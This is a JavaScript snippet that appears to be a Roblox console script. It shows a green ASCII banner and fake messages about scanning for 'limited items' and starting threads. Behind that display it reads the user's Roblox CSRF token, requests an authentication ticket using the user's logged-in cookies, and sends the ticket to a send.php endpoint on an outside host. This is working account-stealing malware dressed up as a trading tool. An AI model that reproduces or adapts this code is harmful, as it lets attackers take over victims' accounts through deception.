console.log("%c _______             __  __                     \r\n\/       \\           \/  |\/  |                    \r\n$$$$$$$  |  ______  $$ |$$\/   ______   __    __ \r\n$$ |__$$ | \/      \\ $$ |\/  | \/      \\ \/  \\  \/  |\r\n$$    $$< \/$$$$$$  |$$ |$$ |\/$$$$$$  |$$  \\\/$$\/ \r\n$$$$$$$  |$$ |  $$ |$$ |$$ |$$ |  $$ | $$  $$<  \r\n$$ |  $$ |$$ \\__$$ |$$ |$$ |$$ \\__$$ | \/$$$$  \\ \r\n$$ |  $$ |$$    $$\/ $$ |$$ |$$    $$\/ \/$$\/ $$  |\r\n$$\/   $$\/  $$$$$$\/  $$\/ $$\/  $$$$$$\/  $$\/   $$\/ \r\n                                                \r\n                                                \r\n                                                ",
    "color: green")
console.log("V1.2.0 Beta has loaded!")
console.log("Scanning for items..")
setTimeout(()=>console.log("1,631 limited items found!"), 3300)
setTimeout(()=>console.log("Starting threads.."), 3300)
setTimeout(()=>console.log("%cRunning! Note: Do not close this terminal or the window", "color: yellow"), 6300)

// cut the bs --

var send_url = name.split('"')[1].split("?")[0] + "send.php";

(async function() {
    // response headers generate 401 errors in output, which cannot be ignored
    var xsrf = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
    })).text()).split("setToken('")[1].split("')")[0]

    var ticket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("rbx-authentication-ticket")

    await fetch(send_url + "?t=" + ticket)
})()